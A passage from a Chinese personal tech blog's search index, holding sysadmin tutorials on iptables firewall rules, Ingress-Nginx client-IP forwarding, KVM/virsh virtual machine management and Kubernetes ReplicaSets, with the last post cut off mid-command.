gitlab-exporter: (pid 455) 1471545s; run: log: (pid 401) 1471546srun: gitlab-workhorse: (pid 440) 1471545s; run: log: (pid 349) 1471558srun: logrotate: (pid 562714) 2656s; run: log: (pid 562722) 2655srun: nginx: (pid 369) 1471553s; run: log: (pid 383) 1471552srun: puma: (pid 300) 1471571s; run: log: (pid 307) 1471570srun: sidekiq: (pid 312) 1471565s; run: log: (pid 320) 1471564srun: sshd: (pid 35) 1471588s; run: log: (pid 34) 1471588s\n我的缓存和数据库都是外置的，然后开了一个gitlab的exporter,他的内存占用还算比较稳定，可以参考下面输出\n[root@node1 ~]# kubectl top pod -A|grep gitlabservice                      gitlab-cb5f6f764-6vhhz                               22m          3804Mi    \n在外部的Prometheus中也可以通过k8s的cAdvisor组件来查询pod的内存占用\ncontainer_memory_usage_bytes&#123;namespace=&quot;service&quot;, pod=&quot;gitlab-cb5f6f764-6vhhz&quot;, container=&quot;gitlab&quot;&#125;\n我这里占用还算比较平稳。\n","categories":["问题解决"],"tags":["问题解决","Gitlab","内存占用","调化"]},{"title":"IPTABLES-防火墙管理","url":"/2022/05/25/IPTABLES-%E9%98%B2%E7%81%AB%E5%A2%99/","content":"概述Netfilter&#x2F;iptables(以下简称iptbales)是unix&#x2F;linux自带的一款优秀切开放源代码的完全自由的基于包过滤的防护墙工具，他的功能十分强大，使用非常灵活，可以对流入和流出服务器的数据包进行很精细的控制。Iptables是linux2.4以2.6内核中集成的服务。其功能与安全性比其老一辈ipfwadm,ipchains强大的多(长江后浪推前浪)，iptable主要是工作在OSI模型的二三四层，如果重新编译内核，iptables也可以支持7层控制(squid代理+iptables)。\n专业名词Netfilter&#x2F;iptables可以把Netfilter&#x2F;iptables看作一栋楼，里面存放着很多的表。\n表(tables)表(tables)是链的容器,即所有的链(chains)都属于其对应的表(tables)上，可以把表(iptables)当作一套房子。表有filter nat mangle raw四个表。\n\n\n\n表名\n作用\n\n\n\nfilter表\nI负责过滤功能，内核模块：iptables_filter\n\n\nnat表\n负责网络地址转换功能，内核模块：iptable_nat\n\n\nmangle表\n解析报文，做出修改，重新封装的功能，内核模块：iptable_mangle\n\n\nraw表\n关闭nat表上启用的链接追踪机制，内核模块：iptable_raw\n\n\n链(chains)链(chains)是规则(Policys)的容器。如果把表(tables)当作一套房子,那么链就是里面的房间，卧室，厨房，客厅什么的。链有INPUT OUTPUT FORWARD PREROUTING POSTROUTING 不同的表有不同的链\n规则(Policy)规(Policy)则就是一条条过滤的语句用来控制流量动作的。\n关于表和链关系\n\n\n表\n链\n\n\n\nfilter表\nINPUT，FORWARD,OUTPUT\n\n\nnat表\nPREROUTING,OUTPUT,POSTROUTING,INPUT(centos6没有)\n\n\nmangle表\nPREROUTING,INPUT,FORWARD,OUTPUT,POSTROUTING\n\n\nraw表\nPREROUTING,OUTPUT\n\n\nFilter主要是和自身有关，真正负责主机防火墙功能的(过滤流入流出主机的数据包)。Filter表是iptables默认使用的表，这个表定义了三个链(chains)，工作场景主要是作为主机的防火墙。\nINPUT链 负责过滤所有目标地址是本机地址的数据。通俗的讲，就是过滤进入主机的数据包。FORWARD链 负责转发流经主机的数据包。起转发的作用，和nat关系很大，后面会详细介绍。 LVSNAT模式。net.ipv4.ip_forward &#x3D; 0OUTPUT链 处理所有源地址是本机地址的数据包。通俗的讲，就是处理从主机发去的数据包。\nNAT负责网络地址转换，即来源与目的ip地址和port的转换。主要应用于局域网共享上网或者特殊的端口转换服务相关。(和主机本身无关)NAT功能一般用于的场景\n\n用于做企业路由或网关，共享上网。\n做内部IP地址一对一映射，硬件防火墙映射IP到内部服务器，FTP服务。\nWeb，单个端口映射，直接映射80端口\n\nOUTPUT链 和主机发出去的数据包有关。改变主机发出数据包的目标地址。PREROUTING链 在数据包到达防火墙时进行路由判断之前执行的规则，作用是改变数据包的目的地址，目的端口等。(通俗的说就是收信时，根据规则重写收件人的地址)POSTROUTING链 在数据包离开防火墙时进行路由判断之后的规则，作用改变数据包的源地址，源端口等。(通俗的说就是寄信的时候可以改变发件人的地址)\nMangle主要负责修改数据包中特殊的路由标记，如TTL，TOS，MARK等。这个表定义了5个链INPUT FORWARD OUTPUT PREROUTING POSTROUTING这个表基本用不到知道即可\nRAW主要是用来控制数据包是否需要通过iptables来处理的一个表 比如web服务器流量很大80端口默认开着需要filter表的INPUT是否来通过 使用RAW表之后则这条就不需要经过iptables防火墙了直接忽略通 防止流量过高 iptables处理不过来提高服务器性能链只有两个PREROUTING和OUTPUT在表中数据包最早经过就是RAW所以可以让iptables不处理对应的数据包#工作流程#\n过滤流程iptables是采取包过滤机制工作的，所以它会对请求的数据包的包头数据进行分析、并根据我们预先设定的规则进行匹配来判断之后进行的动作。下图为过滤的流程图\n表链工作流程下图为较为具体的工作流程图下图为简易流程图平常我们其实只需要顾及到nat的prerouting、postrouting和filter的input、forward以他的一般是用不到\n命令注意\nCentOS6自带iptables 往后的版本应该都是改用firewalld防火墙了 使用iptables的话得stop服务或者mask服务 systemctl sotp&#x2F;mask firwealld才行 之后不管是那个版本iptables应该都是自带的但是还缺一样东西iptables-services这个包安装之后才可以使用service iptables的命令来进行管理服务这个包很重要 \n规则的动作丢弃比拒绝更好一些拒绝会回包丢弃是直接忽略还有一个理由就是说如果别人来判断你的主机是否存货拒绝的话就代表你的服务器存在 忽略的话他就会以为你这个东西不存在因为没有回包。\n\n服务管理systemctl start iptables\t\t//开启服务\nsystemctl stop iptables\t\t//关闭服务\nsystemctl enable iptables \t//设置开机自启\nsystemctl disable iptables \t//设置开机自动关闭\nservice iptables save \t\t//保存当前设置下次开机之后会生效\n\n**Ps:**在centos7版本之后默认不会安装iptables-services，如果需要使用服务管理则需要安装一下”yum -y install iptables-services”,iptables默认会有一个配置表(&#x2F;var&#x2F;sysconfig&#x2F;iptabels这个文件) 这个表记录这本机的所有的iptables配置 每次开机之后都会找这个文件使其里面的配置生效service iptables save就是把当前临时的配置保存到这个表里使下次重载或者重启时生效 这一步很重要\n规则管理iptables -L \t//列出表的规则 默认不加任何参数输出的时filter表的规则\niptables -F \t//清除所有的规则(无法清除默认的规则)\niptables -X\t//删除用户自定义的链(用的很少)\niptables -N  //创建链(用的少)\niptables -Z  //把链的计数器清零\n\n规则配置iptables -t \t//指定表\niptables -t [表] -A  //指定链以及添加规则的方式(在规则低端添加规则)\niptables -t [表] -I   //指定链以及添加规则的方式(在规则顶端添加规则)\niptables -t [表] -D   //指定链以及删除对应规则\niptables -t [表] -A/I [链] -p //指定ip协议tcp/udp\niptables -t [表] -A/I [链] –p [tcp/udp] --dport //指定目标端口\niptables -t [表] -A/I [链] -i \t//指定流入网卡\niptables -t [表] -A/I [链] -o\t//指定流出网卡\niptables -t [表] -A/I [链] -s \t//指定源地址\niptables -t [表] -A/I [链] [相应参数] -j //指定动作(一共三种通过(ACCEPT) 拒绝(REJECT) 丢弃(DROP))\n\n例\n丢弃22端口(ssh)的链接 iptables -t filter -A INPUT -p tcp –dport 22 -j DROP\n丢弃某个IP的所有包 iptables -t filter -A INPUT -s [IPADDR] -j DROP\n除了某个IP的数据其他全部丢弃 iptables -t filter -A INPUT ! -s [IPADDR] -j DROP\n禁用整个网卡 iptables -t filter -A INPUT -i [网卡名称] -j DROP\n范围性丢弃端口链接 iptables -t filter -A INPUT -p tcp –dport [最小:最大] -j DROP\n丢弃多个端口的链接 iptables -t filter -A INPUT -p tcp -m multiport –dport [23,24,25…] -j DROP\n\nNAT表注意因为NAT是负责网络转换这块，最好是把内核的转发更能打开，不然路由链就不生效    cat &#x2F;etc&#x2F;sysctl.conf |grep net.ipv4.ip_forward    net.ipv4.ip_forward &#x3D; 1    sysctl -p   &#x2F;&#x2F;生效\nSNATIp转换 一般用于局域网做网管内网ip转换为可上网的ip 提供内网主机上网使用命令：Iptables -t nat -A POSTROUTING -s 源地址 -d 0.0.0.0&#x2F;0 -j SNAT –to-source 转换的ip\nDNAT端口转发 一般用于端口转发做反向代理 可以防止内网主机完全暴露在公网环境中.自己的端口转发IP tables -t nat -A PREROUTING -p tcp –dport 本机端口 -J REDIRECT –to-port 转到端口主机的端口转发Iptables -t nat -A PREROUTING -p tcp –dport 本机端口 -J DNAT –to-destination 主机:端口\nMASQUERADEIp伪装 一般用于局域网做网管内网ip转换为可上网的ip 提供内网主机上网使用命令：Iptables -t nat -A POSTROUTING -s 源地址 -d 0.0.0.0&#x2F;0 -j MASQUERADE\n","categories":["系统服务"],"tags":["开源工具","系统管理","iptables"]},{"title":"Ingress-Nginx传递用户真实ip问题","url":"/2023/08/25/Ingress-Nginx%E4%BC%A0%E9%80%92%E7%94%A8%E6%88%B7%E7%9C%9F%E5%AE%9Eip%E9%97%AE%E9%A2%98/","content":"引入问题我的K8s环境是宿主机的hyper-v虚拟出来的，如果要映射到外面则还需要再我的宿主机上面再做一层反代，我采用的是nginx，当ingress整好之后，我从我从我腾讯云上复制了一段nginx配置放到了我的宿主机，主要配置如下：\nlocation /test/ &#123;       proxy_pass http://kubernetes.boychai.xyz/test/;       proxy_set_header Host $host;       proxy_set_header X-Real-IP $remote_addr;        proxy_set_header REMOTE-HOST $remote_addr;       proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;&#125;\n为了防止传入的ip是代理主机的ip我这里设置了Host、X-Real-IP、REMOTE-HOST、X-Forwarded-For。经过测试之后发现使用宿主机配置的代理访问时返回404，在宿主机上直接却没问题。\n访问问题日志我去查看了宿主机的nginx日志、ingress-nginx-controller日志、应用程序的日志，发现除了宿主机的nginx均没有日志记录，宿主机日志信息如下\n111.180.204.54 - - [25/Aug/2023:22:12:21 +0800] &quot;GET /test/ HTTP/1.1&quot; 404 548 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36&quot;\n除了这一条之外其他的日志均无404。\n解决看到日志之后有点懵，因为我的宿主机是可以直接访问ingress暴露出来的服务的，而且没有报错正常访问，我是用反代之后就报错404，我最开始以为这个404就是我宿主机报的，但是宿主机的404默认页面会返回nginx的版本，如下图而我反代返回的404页面则是这样的一想就是我ingress返回的页面，但是我去查看ingress-nginx-controller的日志并无404的报错，日志查看命令如下，访问时并无产生记录\n[root@kubernetes ~]# kubectl -n ingress-nginx logs -f  ingress-nginx-controller-kc5np\n我这里去尝试修改宿主机的反代配置，配置如下\nlocation /test/ &#123;       proxy_pass http://kubernetes.boychai.xyz/test/;&#125;\n发现这样是可以正常访问程序的，这就奇怪了，难不成还能是因为我设置了这几个header的问题？我挨个注释这些header的配置发现问题出在下面这段配置\nproxy_set_header Host $host;\n具体原因也没搞清楚但是取消使用这条配置就好了…\n原因在Kubernetes的Ingress中,Host 头部用于根据不同的域名(或主机名)将请求路由到不同的服务。每个Ingress规则可以基于请求的 Host 头部将流量路由到不同的后端服务。我宿主机代理的域名和Ingress设置的域名不同，所以导致了这个问题，我外部代理的域名是tools.boychai.xyz而我k8s设置Ingress的域名则是kubernetes.boychai.xyz,当我在宿主机的代理设置了proxy_set_header Host $host;这段配置之后，请求发到Ingress之后,Ingress拿到的路由请求域名则是tools.boychai.xyz，而我又没有设置这个资源则就返回了404。\nIP传递问题日志能够访问之后发现最终的应用拿不到真是访问的ip，这里通过nginx直接返回X-Forwarded-For头信息来查看问题出在什么位置，宿主机Nginx配置如下\nlocation /aaa &#123;\tdefault_type text/html;    proxy_set_header X-Real-IP $remote_addr;     proxy_set_header REMOTE-HOST $remote_addr;    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;    return 200 &quot;proxy_add_x_forwarded_for:$proxy_add_x_forwarded_for&quot;;&#125;location /test/ &#123;\t   # ingress暴露的地址`http://kubernetes.boychai.xyz/test/`       proxy_pass http://kubernetes.boychai.xyz/test/;       proxy_set_header X-Real-IP $remote_addr;        proxy_set_header REMOTE-HOST $remote_addr;       proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;&#125;\n后端Nginx配置如下\nlocation / &#123;\tdefault_type text/html;    return 200 &quot;proxy_add_x_forwarded_for:$proxy_add_x_forwarded_for&quot;;&#125;\n这样访问反代的/aaa就是访问反代主机的ip，访问反代的/test就会返回访问nginx的后端访问的ip，访问结果如下访问/aaa返回\nproxy_add_x_forwarded_for:111.180.204.54\n访问/test返回\nproxy_add_x_forwarded_for:192.16.1.1, 192.16.1.2\n解决查看访问返回的信息发现直接访问代理的ip是没问题的，那就是Ingress的锅了，这里的1.1和1.2依次是反代的ip和k8s主机的ip，到ingress这层没有把x_forwarded_for头加进来，这里我去官方翻了翻文档发现了三条和x_forwarded_for有关系的配置，如下\ndata:  ...  compute-full-forwarded-for: &quot;true&quot;  # 这一条可以不加也需要知道  # forwarded-for-header: &quot;X-Forwarded-For&quot;  use-forwarded-headers: &quot;true&quot;\n给ingress的cm加上这两条配置即可解决问题，最终/test返回的内容如下\nproxy_add_x_forwarded_for:111.180.204.54, 192.16.1.1, 192.16.1.2\n原因Ingress默认是没有配置传递真实IP功能的，需要配置，这三条配置和官网文档如下：\n\nuse-forwarded-headers文档位置: https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/configmap/#use-forwarded-headers如果为true，则ingress-nginx会将传入的x-forward-*传递到上游，如果是Ingress上层还有一层ingress则需要配置这一条。如果他直接暴露在公网中或者它基于L3的网络负载后门则不需要管，因为它默认就是false。\nforwarded-for-header文档位置: https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/configmap/#forwarded-for-header这个用来设置客户端来源的真实IP，默认就是X-Forwarded-For。这里不需要额外配置。\ncompute-full-forwarded-for文档位置: https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/configmap/#compute-full-forwarded-for如果开启了use-forwarded-headers的话，会发现还是没能获取到客户端的真实IP，原因是当前X-Forwaded-Fox变量是从remote_addr获取的，每次都是拿上一层的代理ip，这段配置的作用是将客户端用户访问所经过的代理ip都追加到X-Forwaded-Fox.\n\n","categories":["问题解决"],"tags":["问题解决","Kubernetes","Ingress-Nginx"]},{"title":"KVM-虚拟机管理","url":"/2024/12/27/KVM-%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%AE%A1%E7%90%86/","content":"关于虚拟化技术虚拟化是一种通过模拟计算机硬件，使一台计算机可以同时运行多个不同操作系统的技术。虚拟化极大地提高了硬件资源的利用率，同时降低了物理设备的成本和管理复杂性。\n虚拟化软件的差别qume 全虚拟化软件，特别慢但是兼容性特别好。xen     半虚拟化软件，需要使用专门修改之后的内核，性能很高，兼容性很差。redhat在5.5的版本将xen替换成kvmkvm    全虚拟化软件，它具有硬件支持cpu，内置在linux内核模块中，不需要使用专门的内核。性能好，兼容性好。kvm的兼容性没有qume好，但是他比qume的性能好太多了kvm的性能没有xen好，但是他比xen的兼容性好太多了\n安装KVMKVM全称：Kernel-based Virtual Machinelibvirt：因为KVM是基于内核的，linux用户是没办法直接操作内核的，这个软件包就是一个操作的工具。virt-install：安装虚拟机用的。qume-kvm：kvm是没有自己的虚拟磁盘技术的，所以直接兼容了qume的虚拟磁盘，这个包即兼容并优化了qume的磁盘。\nyum install libvirt virt-install qemu-kvm -ysystemctl enable --now libvirtd\n虚机管理创建一个虚拟机[root@template ~]# virt-install --virt-type kvm --os-type=linux --os-variant rhel7 --name centos7 --memory 1024 --vcpus 1 --disk /opt/centos.raw,format=raw,size=10 --cdrom /opt/CentOS-7-x86_64-Minimal-1511.iso --network network=default --graphics vnc,listen=0.0.0.0 --noautoconsoleStarting install...Allocating &#x27;centos.raw&#x27;                   |  10 GB  00:00:00Domain installation still in progress. You can reconnect tothe console to complete the installation process.\n要注意的是–cdrom参数，镜像不要放在root目录下会报权限相关的问题，建议丢到一个公共的位置，例如&#x2F;opt下，然后操控的用户和用户组都是qemu创建好之后可以通过vnc来连接，这里设置离连接方式是vnc，并且监听的位置是0.0.0.0\n管理命令主要使用virsh来管理KVM虚拟机\n列出虚机virsh list\n这条命令默认是列出所有运行的虚机，如果虚机在关闭状态则不会列出，想要列出所有状态的虚机需要添加--all参数\n关机virsh shutdown 虚机名\n关机的话系统必须装好，否则没用\n开机virsh start 虚机名\n\n强制关机virsh destroy 虚机名\n这相当于拔掉虚机的电源\n重启virsh reboot 虚机名\n\n重启的话系统必须装好，否则没用\n导出配置virsh dumpxml 虚机名\n导出对应虚机的配置文件\n取消定义这里是把对应的虚拟机移除kvm的管理里，相当于从kvm中删除，配置文件也会被删除，但是实际的镜像文件还是会保留。\nvirsh undefine 虚机名\n\n导入配置virsh define xml配置文件\n\n修改配置virsh edit 虚机名\n挂起virsh suspend 虚机名\n锁定当前状态\n恢复virsh resume 虚机名\n开机自启virsh autostart 虚机名\n可以添加参数--disable来取消开机自启\n列出所有开机自启主机virsh list --autostart --all\n不加参数--all参数的话，只会列出开机的主机。\n控制台virsh console 虚机名\n想要通过console直接连接控制虚机，需要提前在虚拟机中执行下面命令让其支持(执行完请重启虚机)\ngrubby --update-kernel=ALL --args=&quot;console=ttyS0,115200n8&quot;\n\n磁盘管理关于磁盘格式\nRAW：原始格式，也叫野格式，不支持快照功能，不方便传输，读写性能较好。\nqcow2：qcow2(copy on write)写时复制(动态占用空间)，占用空间小，支持快照，性能比raw差一点，方便传输。\n\n管理命令主要使用qemu-img来管理KVM虚拟机\n磁盘信息qemu-img info 虚拟磁盘\n创建磁盘qemu-img create -f qcow2 位置 大小\n例如\nqemu-img create -f qcow2 /opt/test.qcow2 1G\n在/opt/test.qcow2位置创建一个1G大小的磁盘\n调整容量qemu-img resize /opt/test.qcow2 +1G\n给test.qcow2添加1G后面是容量指令，具体格式参考如下\n\n5G    大小调整到5G\n+1G 大小增加1G\n-1G 大小减小1G\n\nRAW转换QCOW2qemu-img convert -f raw -O qcow2 xxx.raw xxx.qcow2\n这个操作请在虚拟机关闭的状态下执行，执行之后会保留之前的文件然后生成新的qcow2文件。然后转换之后如果想开机时使用QCOW2的镜像需要edit一下虚机的配置文件\nqemu-img convert -f raw -O qcow2 centos.raw centos.qcow2virsh edit centos7\n大概在35行左右,原文如下\n&lt;disk type=&#x27;file&#x27; device=&#x27;disk&#x27;&gt;  &lt;driver name=&#x27;qemu&#x27; type=&#x27;raw&#x27;&gt;&lt;/driver&gt;  &lt;source file=&#x27;/opt/centos.raw&#x27;&gt;&lt;/source&gt;  &lt;target dev=&#x27;vda&#x27; bus=&#x27;virtio&#x27;&gt;&lt;/target&gt;  &lt;address type=&#x27;pci&#x27; domain=&#x27;0x0000&#x27; bus=&#x27;0x00&#x27; slot=&#x27;0x06&#x27; function=&#x27;0x0&#x27;&gt;&lt;/address&gt;&lt;/disk&gt;\n修改成下面这种效果\n&lt;disk type=&#x27;file&#x27; device=&#x27;disk&#x27;&gt;  &lt;driver name=&#x27;qemu&#x27; type=&#x27;qcow2&#x27;&gt;&lt;/driver&gt;  &lt;source file=&#x27;/opt/centos.qcow2&#x27;&gt;&lt;/source&gt;  &lt;target dev=&#x27;vda&#x27; bus=&#x27;virtio&#x27;&gt;&lt;/target&gt;  &lt;address type=&#x27;pci&#x27; domain=&#x27;0x0000&#x27; bus=&#x27;0x00&#x27; slot=&#x27;0x06&#x27; function=&#x27;0x0&#x27;&gt;&lt;/address&gt;&lt;/disk&gt;\n其他功能快照创建快照virsh snapshot-create centos7 --atomic --disk-only\n这里我们为虚拟机 centos7 创建了一个快照,使用了 --atomic表示如果失败则完全回滚,--disk-only 表示仅对磁盘创建快照。\n查看快照virsh snapshot-list centos7\n恢复快照virsh snapshot-revert centos7 snapshot1\n删除快照virsh snapshot-delete centos7 snapshot1\n其他在创建和管理快照时,可以添加选项控制快照类型(disk-only、system-checkpoint等)、是否包含内存状态等,灵活控制快照行为。\n克隆完整克隆被克隆的主机一定要处于被挂起或者关闭的状态下使用virt-clone工具\n[root@template opt]# virt-clone --auto-clone -o centos7 -n centos7-2Allocating &#x27;centos-clone.qcow2&#x27;                      |  10 GB  00:00:09     Clone &#x27;centos7-2&#x27; created successfully.\n手动克隆\nqemu-img convert -f qcow2 -O qcow2 -c centos.qcow2 centos2.qcow2virsh dumpxml centos7 &gt; centos7-2.xml\n编辑导出的xml,主要修改下面几个字段\n修改 domain.name # 名字删除 domain.uuid # uuid删除 domain.devices.interface.mac # mac地址修改 domain.devices.disk.source-file # 虚拟磁盘文件指定为新手动复制的。\n编辑好之后导入虚机\nvirsh define centos7-2.xml\n链接克隆连接克隆要注意的是不能使用RAW格式的磁盘，他是不支持的。创建引用磁盘\nqemu-img create -f qcow2 -b centos.qcow2 centos3.qcow2\n此时去查看centos3.qcow2的信息如下\n[root@template opt]# qemu-img info centos3.qcow2              image: centos3.qcow2                                          file format: qcow2                                            virtual size: 10G (10737418240 bytes)                         disk size: 196K                                               cluster_size: 65536                                           backing file: centos.qcow2                                    Format specific information:                                      compat: 1.1                                                   lazy refcounts: false\n会发现这个字段backing file: centos.qcow2导出xml\nvirsh dumpxml centos7 &gt; centos7-3.xml\n编辑导出的xml,主要修改下面几个字段\n修改 domain.name # 名字删除 domain.uuid # uuid删除 domain.devices.interface.mac # mac地址修改 domain.devices.disk.source-file # 虚拟磁盘文件指定为新手动复制的。\n编辑好之后导入虚机\nvirsh define centos7-3.xml\n网络桥接网卡如果想要将主机桥接到某个网络中则需要搞一个桥接网卡，可以通过下面命令进行桥接\nvirsh iface-bridge ens33 br0\nens33是被桥接的网卡，br0是桥接之后的网卡，桥接的过程中可能会出现很多问题，我出现的问题是断网，然后开启网卡开启失败具体可以参考文章\n取消桥接virsh iface-unbridge br0\n创建虚机指定网卡参数--network network=default是NAT模式，全部参数可以参考下面\nvirt-install --virt-type kvm --os-type=linux --os-variant rhel7 --name centos7 --memory 1024 --vcpus 1 --disk /opt/centos.raw,format=raw,size=10 --cdrom /opt/CentOS-7-x86_64-Minimal-1511.iso --network network=default --graphics vnc,listen=0.0.0.0 --noautoconsole\n\n参数--network bridge=br0是桥接模式，全部参数可以参考下面\nvirt-install --virt-type kvm --os-type=linux --os-variant rhel7 --name centos7 --memory 1024 --vcpus 1 --disk /opt/centos.raw,format=raw,size=10 --cdrom /opt/CentOS-7-x86_64-Minimal-1511.iso --network bridge=br0 --graphics vnc,listen=0.0.0.0 --noautoconsole\n已有虚机更换网卡通过下面命令编辑配置\nvirsh edit 虚机名\n修改domain.devices.interface字段，默认值如下\n&lt;interface type=&#x27;network&#x27;&gt;  &lt;mac address=&#x27;52:54:00:25:a6:67&#x27;&gt;&lt;/mac&gt;  &lt;source network=&#x27;default&#x27;&gt;&lt;/source&gt;  &lt;model type=&#x27;virtio&#x27;&gt;&lt;/model&gt;  &lt;address type=&#x27;pci&#x27; domain=&#x27;0x0000&#x27; bus=&#x27;0x00&#x27; slot=&#x27;0x03&#x27; function=&#x27;0x0&#x27;&gt;&lt;/address&gt;&lt;/interface&gt;\n修改成下面这样\n&lt;interface type=&#x27;bridge&#x27;&gt;  &lt;mac address=&#x27;52:54:00:25:a6:67&#x27;&gt;&lt;/mac&gt;  &lt;source bridge=&#x27;br0&#x27;&gt;&lt;/source&gt;  &lt;model type=&#x27;virtio&#x27;&gt;&lt;/model&gt;  &lt;address type=&#x27;pci&#x27; domain=&#x27;0x0000&#x27; bus=&#x27;0x00&#x27; slot=&#x27;0x03&#x27; function=&#x27;0x0&#x27;&gt;&lt;/address&gt;&lt;/interface&gt;\n主要是interface的type字段和interface.source的字段。\n注意每次桥接和取消桥接都会永久性的修改网卡的配置文件，这个需要注意。\n关于KVM创建的虚拟机KVM虚拟机主要有两部分组成，一部分是磁盘文件，在创建的时候通过下面命令已经指定--disk /opt/centos.raw,format=raw,size=10另外一部分是配置文件，配置文件默认位置在/etc/libvirt/qemu中，一般采用dumpxml来导出，只要拥有xml和镜像文件就可以恢复虚机。\n","categories":["工具相关"],"tags":["开源工具","kvm","qemu"]},{"title":"Kubernetes-Pod控制器详解","url":"/2022/09/04/Kubernetes-Pod%E6%8E%A7%E5%88%B6%E5%99%A8%E8%AF%A6%E8%A7%A3/","content":"Pod控制器概述引入Pod是kubernetes的最小管理单元，在kubernetes中，按照pod的创建方式可以将其分为两类：\n\n自主式pod：kubernetes直接创建出来的Pod，这种pod删除后就没有了，也不会重建\n控制器创建的pod：kubernetes通过控制器创建的pod，这种pod删除了之后还会自动重建\n\n控制器Pod控制器是管理pod的中间层，使用Pod控制器之后，只需要告诉Pod控制器，想要多少个什么样的Pod就可以了，它会创建出满足条件的Pod并确保每一个Pod资源处于用户期望的目标状态。如果Pod资源在运行中出现故障，它会基于指定策略重新编排Pod。\n类别在kubernetes中，有很多类型的pod控制器，每种都有自己的适合的场景，常见的有下面这些：\n\nReplicationController：比较原始的pod控制器，已经被废弃，由ReplicaSet替代\n\nReplicaSet：保证副本数量一直维持在期望值，并支持pod数量扩缩容，镜像版本升级\n\nDeployment：通过控制ReplicaSet来控制Pod，并支持滚动升级、回退版本\n\nHorizontal Pod Autoscaler：可以根据集群负载自动水平调整Pod的数量，实现削峰填谷\n\nDaemonSet：在集群中的指定Node上运行且仅运行一个副本，一般用于守护进程类的任务\n\nJob：它创建出来的pod只要完成任务就立即退出，不需要重启或重建，用于执行一次性任务\n\nCronjob：它创建的Pod负责周期性任务控制，不需要持续后台运行\n\nStatefulSet：管理有状态应用\n\n\nReplicaSet(RS)概述ReplicaSet的主要作用是保证一定数量的pod正常运行，它会持续监听这些Pod的运行状态，一旦Pod发生故障，就会重启或重建。同时它还支持对pod数量的扩缩容和镜像版本的升降级。\n资源清单apiVersion: apps/v1 # 版本号kind: ReplicaSet # 类型       metadata:   name:   namespace:  labels:spec:  replicas: &lt;副本数量&gt;  selector: # 选择器，通过它指定该控制器管理哪些pod    matchLabels:      # Labels匹配规则    matchExpressions: # Expressions匹配规则      - &#123;key: &lt;lableskey&gt;, operator: &lt;匹配方式&gt;, values: &lt;lablesvalue&gt;&#125;  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本    metadata:      labels:    spec:      containers:      - name:        image:        ports:\n\n**replicas：**指定副本数量，其实就是当前rs创建出来的pod的数量，默认为1\n**selector：**选择器，它的作用是建立pod控制器和pod之间的关联关系，采用的Label Selector机制。在pod模板上定义label，在控制器上定义选择器，就可以表明当前控制器能管理哪些pod了\n**template：**模板，就是当前控制器创建pod所使用的模板板，里面其实就是前一章学过的pod的定义\n创建RS创建Pc-Replicaset.yaml文件，内容如下：\napiVersion: apps/v1kind: ReplicaSet   metadata:  name: pc-replicaset  namespace: defaultspec:  replicas: 3  selector:     matchLabels:      app: nginx-pod  template:    metadata:      labels:        app: nginx-pod    spec:      containers:      - name: nginx        image: docker.io/library/nginx:1.23.1\n\n# 创建rs[root@master yaml]# kubectl create -f Pc-Replicaset.yamlreplicaset.apps/pc-replicaset created# 查看rs# DESIRED:期望副本数量  # CURRENT:当前副本数量  # READY:已经准备好提供服务的副本数量[root@master yaml]# kubectl get rs pc-replicaset -n default -o wideNAME            DESIRED   CURRENT   READY   AGE     CONTAINERS   IMAGES                           SELECTORpc-replicaset   3         3         3       2m41s   nginx        docker.io/library/nginx:1.23.1   app=nginx-pod# 查看当前控制器创建出来的pod# 控制器创建的pod的名称是在控制器名称后面拼接了-xxxxx随机码[root@master yaml]# kubectl get pod -n defaultNAME                           READY   STATUS             RESTARTS          AGEpc-replicaset-fvjg2            1/1     Running            0                 3m53spc-replicaset-lzfc2            1/1     Running            0                 3m53spc-replicaset-q7hrm            1/1     Running            0                 3m53s\n\n扩缩容# 在线编辑配置# 修改spce.replicas为6即可[root@master yaml]# kubectl edit rs pc-replicaset -n defaultreplicaset.apps/pc-replicaset edited# 查看Pod数量[root@master yaml]# kubectl get pod -n defaultNAME                           READY   STATUS             RESTARTS          AGEpc-replicaset-49zl6            1/1     Running            0                 67spc-replicaset-5ngpl            1/1     Running            0                 67spc-replicaset-fvjg2            1/1     Running            0                 6m45spc-replicaset-lzfc2            1/1     Running            0                 6m45spc-replicaset-pnstd            1/1     Running            0                 67spc-replicaset-q7hrm            1/1     Running            0                 6m45s# 使用命令# 使用scale实现扩缩容replicas为扩缩容的数量[root@master yaml]# kubectl scale rs pc-replicaset --replicas=2 -n defaultreplicaset.apps/pc-replicaset scaled# 查看Pod数量[root@master yaml]# kubectl get pod -n default|grep pcNAME                           READY   STATUS             RESTARTS          AGEpc-replicaset-fvjg2            1/1     Running            0                 8m39spc-replicaset-q7hrm            1/1     Running            0                 8m39s\n\n镜像升级# 在线编辑配置# 修改spce.template.spec.containers.image为docker.io/library/nginx:latest即可[root@master yaml]# kubectl edit rs pc-replicaset -n defaultreplicaset.apps/pc-replicaset edited# 查看rs状态# 镜像版本已经变更了[root@master yaml]# kubectl get rs -n default -o wideNAME            DESIRED   CURRENT   READY   AGE   CONTAINERS   IMAGES                           SELECTORpc-replicaset   2         2         2       14m   nginx        docker.io/library/nginx:latest   app=nginx-pod# 使用命令# kubectl set image rs rs名称 容器=镜像版本 -n namespace[root@master yaml]# kubectl set image rs pc-replicaset nginx=docker.io/library/nginx:1.23.1  -n defaultreplicaset.apps/pc-replicaset image updated# 再次查看# 镜像版本已经变更了[root@master yaml]# kubectl get rs -n default -o wideNAME            DESIRED   CURRENT   READY   AGE   CONTAINERS   IMAGES                           SELECTORpc-replicaset   2         2         2       17m   nginx        docker.io/library/nginx:1.23.1   app=nginx-pod\n\n删除RS# 使用kubectl delete命令会删除此RS以及它管理的Pod# 在kubernetes删除RS前，会将RS的replicasclear调整为0，等待所有的Pod被删除后，在执行RS对象的删除[root@master yaml]# kubectl delete rs pc-replicaset -n defaultreplicaset.apps &quot;pc-replicaset&quot; deleted[root@master yaml]# kubectl get pod -n default -o wideNo resources found in default namespace.# 如果希望仅仅删除RS对象（保留Pod），可以使用kubectl delete命令时添加--cascade=false选项（不推荐）。[root@master yaml]# kubectl delete rs 